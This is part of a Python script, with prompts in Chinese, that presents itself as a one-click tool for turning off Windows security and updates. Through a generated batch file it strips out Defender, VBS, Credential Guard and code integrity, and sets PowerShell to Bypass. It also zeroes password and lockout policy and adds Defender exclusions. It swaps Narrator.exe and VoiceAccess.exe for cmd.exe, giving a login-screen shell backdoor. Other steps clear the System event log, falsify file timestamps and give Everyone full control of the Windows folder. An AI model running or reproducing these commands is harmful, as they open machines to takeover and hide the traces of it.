        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments /t REG_DWORD /v ScanWithAntiVirus /d 1 /f"
        + chr(10)
        + 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WSearch" /v Start /t REG_DWORD /d 4 /f'
        + chr(10)
        + 'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows\\Windows Search" /v PreventIndexing /t REG_DWORD /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting" /t REG_DWORD /v DontShowUI /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting" /t REG_DWORD /v Disabled /d 1 /f'
        + chr(10)
        + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard /v EnableVirtualizationBasedSecurity /f"
        + chr(10)
        + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard /v RequirePlatformSecurityFeatures /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v LsaCfgFlags /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard /t REG_DWORD /v LsaCfgFlags /d 0 /f"
        + chr(10)
        + "echo Y | Powershell Set-ExecutionPolicy -ExecutionPolicy Bypass -Force  -Scope CurrentUser"
        + chr(10)
        + "echo Y | Powershell Set-ExecutionPolicy -ExecutionPolicy Bypass -Force  -Scope LocalMachine"
        + chr(10)
        + "reg add HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell /t REG_SZ /v ExecutionPolicy /d Bypass /f"
        + chr(10)
        + "reg add HKCU\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell /t REG_SZ /v ExecutionPolicy /d Bypass /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell /t REG_DWORD /v EnableScripts /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell /t REG_SZ /v ExecutionPolicy /d Bypass /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell /t REG_DWORD /v EnableScripts /d 1 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell /t REG_SZ /v ExecutionPolicy /d Bypass /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\icssvc\\Settings /t REG_DWORD /v WifiMaxPeers /d 128 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\icssvc\\Settings /t REG_DWORD /v PeerlessTimeoutEnabled /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\icssvc\\Settings /t REG_DWORD /v PeerlessTimeout /d 120 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\icssvc\\Settings /t REG_DWORD /v PublicConnectionTimeout /d 60 /f"
        + chr(10)
        + "bcdedit /set disabledynamictick yes"
        + chr(10)
        + "bcdedit /set useplatformclock no"
        + chr(10)
        + "net accounts /lockoutthreshold:0"
        + chr(10)
        + "net accounts /minpwlen:0"
        + chr(10)
        + "net accounts /maxpwage:unlimited"
        + chr(10)
        + "net accounts /minpwage:0"
        + chr(10)
        + "echo [Unicode] > PasswordSecEdit.inf"
        + chr(10)
        + "echo Unicode=yes >> PasswordSecEdit.inf"
        + chr(10)
        + "echo [System Access] >> PasswordSecEdit.inf"
        + chr(10)
        + "echo MinimumPasswordAge = 0 >> PasswordSecEdit.inf"
        + chr(10)
        + "echo MaximumPasswordAge = -1 >> PasswordSecEdit.inf"
        + chr(10)
        + "echo MinimumPasswordLength = 0 >> PasswordSecEdit.inf"
        + chr(10)
        + "echo PasswordComplexity = 0 >> PasswordSecEdit.inf"
        + chr(10)
        + "echo PasswordHistorySize = 0 >> PasswordSecEdit.inf"
        + chr(10)
        + "echo [Version] >> PasswordSecEdit.inf"
        + chr(10)
        + "echo signature="
        + chr(34)
        + "$CHICAGO$"
        + chr(34)
        + " >> PasswordSecEdit.inf"
        + chr(10)
        + "echo Revision=1 >> PasswordSecEdit.inf"
        + chr(10)
        + "secedit /configure /db temp.sdb /cfg PasswordSecEdit.inf /quiet /overwrite"
        + chr(10)
        + "del /f /q temp.sdb"
        + chr(10)
        + "del /f /q temp.jfm"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v MinimumPasswordAge /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v MinimumPasswordLength /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v PasswordComplexity /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v PasswordHistorySize /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v MinimumPasswordAge /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRecentDocsHistory /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRecentDocsHistory /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v ClearRecentDocsonExit /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v ShowOrHideMostUsedApps /d 2 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v HideRecommendedSection /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v DisableSearchBoxSuggestions /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v HideRecommendedPersonalizedSites /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v HideRecentlyAddedApps /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\StorageSense /t REG_DWORD /v AllowStorageSenseGlobal /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoStartMenuMFUprogramsList /d 1 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoStartMenuMFUprogramsList /d 1 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\TaskbarDeveloperSettings /t REG_DWORD /v TaskbarEndTask /d 1 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v ShowSuperHidden /d 1 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 0 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v ShowSuperHidden /d 1 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRecentDocsHistory /d 1 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRecentDocsHistory /d 1 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v ClearRecentDocsonExit /d 1 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v ShowOrHideMostUsedApps /d 2 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v HideRecommendedSection /d 1 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v DisableSearchBoxSuggestions /d 1 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v HideRecommendedPersonalizedSites /d 1 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /t REG_DWORD /v HideRecentlyAddedApps /d 1 /f"
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\StorageSense /t REG_DWORD /v AllowStorageSenseGlobal /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoStartMenuMFUprogramsList /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoStartMenuMFUprogramsList /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\TaskbarDeveloperSettings /t REG_DWORD /v TaskbarEndTask /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v ShowSuperHidden /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v ShowSuperHidden /d 1 /f"
        + chr(10)
        + 'takeown /f "%systemroot%\\System32\\VoiceAccess.exe" /a & icacls "%systemroot%\\System32\\VoiceAccess.exe" /grant Everyone:F & copy /y "%systemroot%\\System32\\cmd.exe" "%systemroot%\\System32\\VoiceAccess.exe"'
        + chr(10)
        + 'takeown /f "%systemroot%\\System32\\Narrator.exe" /a & icacls "%systemroot%\\System32\\Narrator.exe" /grant Everyone:F /t & copy /y "%systemroot%\\System32\\cmd.exe" "%systemroot%\\System32\\Narrator.exe"'
        + chr(10)
        + 'powershell -Command "Clear-RecycleBin -Force -ErrorAction:Ignore"'
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CI /t reg_dword /v FeatureSetState /d 0 /f"
        + chr(10)
        + (
            'reg add %s\\%s\\command /f /d "%s"'
            % (
                "HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell",
                "断开RDP连接且保持程序运行",
                "cmd /c for /f \\\"delims=\\\" %%%%i in ('powershell $env:UserName') do (for /f \\\"skip=1 tokens=3\\\" %%%%s in ('query user %%%%i') do (tscon.exe %%%%s /dest:console) & timeout /t 5)",
            )
        )
        + chr(10)
        + install_wim_tweak_win_exe
        + " /o /l"
        + chr(10)
        + install_wim_tweak_win_exe
        + ' /o /c "Windows-Defender" /r'
        + chr(10)
        + install_wim_tweak_win_exe
        + " /h /o /l"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{B4BFCC3A-DB2C-424C-B029-7FE99A87C641} /d CLSID_ThisPCDesktopRegFolder /f"
        + chr(10)
        + 'for /f "delims=" %%i in (\'reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\') do (reg add "%%i" /t REG_DWORD /v DelayedAutostart /d 0 /f)'
        + chr(10)
        + 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" /v DisableAcrylicBackgroundOnLogon /t REG_DWORD /d 1 /f'
        + chr(10)
        + 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v UseDefaultTile /t REG_DWORD /d 1 /f'
        + chr(10)
        + "wevtutil.exe cl system"
        + chr(10)
        + "powershell \"Get-item -path '%cd%\\*'  | foreach-object { $_.LastWriteTime ='01/01/3000 00:00:00' ; $_.CreationTime = '01/01/3000 00:00:00'; $_.LastWriteTime = '01/01/3000 00:00:00'  } 2>$null\""
        + chr(10)
        + runtask
        + chr(10)
        + "powershell "
        + chr(34)
        + "try {$null = icim MSFT_MpPreference @{ExclusionPath = @("
        + chr(39)
        + "%~dp0"
        + chr(39)
        + "); Force = $True} Add -Namespace root/Microsoft/Windows/Defender -EA 1} catch {$host.SetShouldExit($_.Exception.HResult)}"
        + chr(34)
        + ""
        + chr(10)
        + "powershell "
        + chr(34)
        + "try {$null = icim MSFT_MpPreference @{ExclusionPath = @("
        + chr(39)
        + "%temp%\\_temp_heu168yyds"
        + chr(39)
        + "); Force = $True} Add -Namespace root/Microsoft/Windows/Defender -EA 1} catch {$host.SetShouldExit($_.Exception.HResult)}"
        + chr(34)
        + ""
        + chr(10)
        + ""
        + chr(10)
        + "powershell -command \"Get-ScheduledTask -TaskPath '\\Microsoft\\Windows\\Zhang\\*' | ForEach-Object { try { $task=$_; $_.Settings.ExecutionTimeLimit='PT0S'; $_.Settings.DisallowStartIfOnBatteries=$false; $_.Settings.StopIfGoingOnBatteries=$false; $_.Settings.StartWhenAvailable=$true; $_.Settings.Hidden=$false; $_.Settings.RestartCount=0; Set-ScheduledTask -InputObject $_; Write-Host '成功修改: '+$_.TaskName } catch { Write-Host '修改失败: '+$_.TaskName+' ('+$_+')' } }\""
    )
    print("[正在操作]释放依赖")
    with smart_open.smart_opens(bat_file, "w") as f:
        f.write(bat_w)
    RunWrapper(runtask).read()
    print("[正在操作]执行命令")
    RunWrapper(
        "powershell -command \"Get-ScheduledTask -TaskPath '\\Microsoft\\Windows\\Zhang\\*' | ForEach-Object { try { $task=$_; $_.Settings.ExecutionTimeLimit='PT0S'; $_.Settings.DisallowStartIfOnBatteries=$false; $_.Settings.StopIfGoingOnBatteries=$false; $_.Settings.StartWhenAvailable=$true; $_.Settings.Hidden=$false; $_.Settings.RestartCount=0; Set-ScheduledTask -InputObject $_; Write-Host '成功修改: '+$_.TaskName } catch { Write-Host '修改失败: '+$_.TaskName+' ('+$_+')' } }\""
    ).read()
    try:
        rename_if_user_equals_computer()
    except:
        pass
    print("[正在操作]写入注册表")
    bat_to_reg_reader(bat_w)
    print("[正在操作]正在扫描更新相关服务并禁用")
    block_all_update()
    print("[正在操作]注册表写入完成")
    run_as_admin("cmd", f'/c "{bat_file}"')
    Run = RunWrapper(
        "schtasks /Run /tn Microsoft\\Windows\\Zhang\\Disable_Safe /I"
    ).read()
    print(f"[正在操作]{Run}")
    if argvlen == 1:
        RunWrapper(uwd_exe)
        print(
            "[提示]开启测试模式后 桌面右下角可能出现测试模式水印 请运行uwd.exe并点击install来去除水印"
        )
        input("[操作完成]建议重启系统以应用设置")


WindowsDir = str(os.environ.get("systemroot"))
ProtectDir = str(WindowsDir + "\\Protect\\").casefold()
Disable_Safety_Info = ProtectDir + "Disable_Safety_Info"
install_wim_tweak_win_exe = WindowsDir + "\\install_wim_tweak.exe"
uwd_exe = WindowsDir + "\\uwd.exe"
efiguard_zip = WindowsDir + "\\EfiGuard.7z"
efiguard_dir = WindowsDir + "\\EfiGuard"
bootice_exe = efiguard_dir + "\\BOOTICE.exe"
diskgenius_exe = efiguard_dir + "\\DiskGenius.exe"
RunWrapper(
    "cmd /c takeown /f %systemroot% /a & icacls %systemroot% /c /q /grant Everyone:(OI)(CI)(F)"
).read()


def print_cmd_helper():
    print("---" * 10)
    print("命令行参数说明: \n")
    print("\n命令行参数与程序内设置等效,参数与值使用等号连接(例如closeall=1)")
    print("\n参数：")
    print("\n closeall=[1,2] 1-->完全关闭 ; 2 --> 不开启调试模式")
    print("\n disablevbs=[1,2] 1-->关闭Hyper-V ; 2 --> 不关闭Hyper-V")
    print("\n restore=[0,1] 0-->无操作 ; 1 --> 根据用户上次操作选项重新覆盖设置")
    print("\n -no_uac --> 不自动提权")
    print(f"\n 用户操作保存位置:{Disable_Safety_Info}")
    print("\n可用参数 -h 获取本说明")
    print("---" * 10)


def main(argv):
    b64_to_file(uwd_exe, uwdf, force=True)
    b64_to_file(install_wim_tweak_win_exe, install_wim_tweakf, force=True)
    b64zip_to_file(efiguard_zip, EfiGuardf, force=True, extraPath=WindowsDir)
    args_dict = {"closeall": 2, "disablevbs": 1, "restore": 0}
    if len(argv) == 1:
        print("一键关闭Windows防护策略/更新")
        print("---" * 10)
        print("---使用参数 -h 查看帮助---")
        print("---" * 10)
        choose = input(
            "\n将进行如下操作:\n1)关闭Windows防火墙\n2)关闭安全中心实时防护\n3)优化用户账户控制(UAC)\n4)关闭驱动签名验证\n5)关闭VBS(Win11)\n6)关闭内存完整性检验\n7)调整Windows更新策略\n8)开启测试模式\n9)移除Defender组件\n \n请选择:\n1)完全关闭\n2)不开启调试模式\n\n输入数字并按下回车继续操作:"
        )
        if not choose in ["1", "2"]:
            choose = "1"
        choose = int(choose)
        args_dict["closeall"] = choose
        print("\n您选择了: %s\n" % ("完全关闭" if choose == 1 else "不开启调试模式"))

        choose2 = input(
            "是否关闭Hyper-v(关闭VBS)功能？[如果需要关闭VBS且保证WSA或WSL等Hyper-v功能正常工作,请移步EfiGuard(已释放到 %s)]\n请选择：\n1)关闭\n2)不关闭\n\n输入数字并按下回车继续操作:"
            % efiguard_dir
        )

        if not choose2 in ["1", "2"]:
            choose2 = "1"
        choose2 = int(choose2)
        args_dict["disablevbs"] = choose2
        print("\n您选择了: %s\n" % ("关闭" if choose2 == 1 else "不关闭"))
    else:

        for i in argv:
            if "=" in i:
                spl = i.split("=")
                if len(spl) == 2:
                    setting = spl[0]
                    argument = spl[1]
                    for j in args_dict.keys():
                        if j == setting:
                            try:
                                args_dict[setting] = int(argument)
                            except:
                                pass
        print(f"您设置的参数:{args_dict}")
        if args_dict["restore"] == 1:
            if os.path.isfile(Disable_Safety_Info):
                with smart_open.smart_opens(Disable_Safety_Info, "r") as f:
                    Disable_Safety_Info_read = f.readlines()
                for i in Disable_Safety_Info_read:
                    if "=" in i:
                        spl = i.split("=")
                        if len(spl) == 2:
                            args_dict[spl[0]] = spl[1].replace("\n", "")
                print(f"用户上一次的设置:{args_dict}")
            else:
                print("无上一次的设置记录,将使用默认值。")
    try:
        with smart_open.smart_opens(Disable_Safety_Info, "w") as f:
            f.write("\n".join([f"{i[0]}={i[1]}" for i in args_dict.items()]))
        work(args_dict["closeall"], args_dict["disablevbs"], len(argv))
    except Exception as e:
        print(e)
        exit(1)


if __name__ == "__main__":
    argv = sys.argv
    config.is_testflag = True
    if not is_admin():
        print("请以管理员身份运行")
        time.sleep(3)
        exit(0)
    if any(flag in argv for flag in ("-h", "/h", "/?", "--help")):
        print_cmd_helper()
        exit(0)
    if not "-no_uac" in argv:
        if get_system_elevate.elevate_self():
            time.sleep(3)
            exit(0)
    main(argv)
